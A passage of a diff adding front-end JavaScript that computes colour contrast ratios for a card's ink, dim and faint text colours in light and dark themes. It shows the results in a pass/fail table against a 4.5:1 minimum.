+  const rows = [
+    ['--ink on the card at its lightest',  ratio(ink, sheenTop), 4.5],
+    ['--ink on the card at its darkest',   ratio(ink, sheenBot), 4.5],
+    ['--dim on the card at its lightest',  ratio(dim, sheenTop), 4.5],
+    ['--dim on the card at its darkest',   ratio(dim, sheenBot), 4.5],
+    ['--faint (corrected) worst point',    Math.min(ratio(faint, sheenTop), ratio(faint, sheenBot)), 4.5],
+    ['--faint on flat --panel, for comparison', ratio(faint, panel), 4.5],
+  ];
+
+  tableEl.replaceChildren();
+  const cap = document.createElement('p');
+  const thead = document.createElement('thead');
+  const htr = document.createElement('tr');
+  for (const h of ['measured on the glossed card','ratio','min','']){
+    const th = document.createElement('th'); th.setAttribute('scope','col'); th.textContent = h; htr.append(th);
+  }
+  thead.append(htr);
+  const tbody = document.createElement('tbody');
+  for (const [label, r, min] of rows){
+    const tr = document.createElement('tr');
+    const a = document.createElement('td'); a.textContent = label;
+    const b = document.createElement('td'); b.className = 'num'; b.textContent = r.toFixed(2) + ':1';
+    const c = document.createElement('td'); c.className = 'num'; c.textContent = min.toFixed(1);
+    const d = document.createElement('td');
+    d.className = r >= min ? 'pass' : 'fail';
+    d.textContent = r >= min ? 'pass' : 'FAIL';
+    tr.append(a,b,c,d); tbody.append(tr);
+  }
+  tableEl.append(thead, tbody);
+}
+
+function measureAll(){
+  measure(document.querySelector('.force-light'), document.querySelector('[data-meas="light"]'));
+  measure(document.querySelector('.force-dark'),  document.querySelector('[data-meas="dark"]'));
+}
+
+paint();
+measureAll();
+</script>
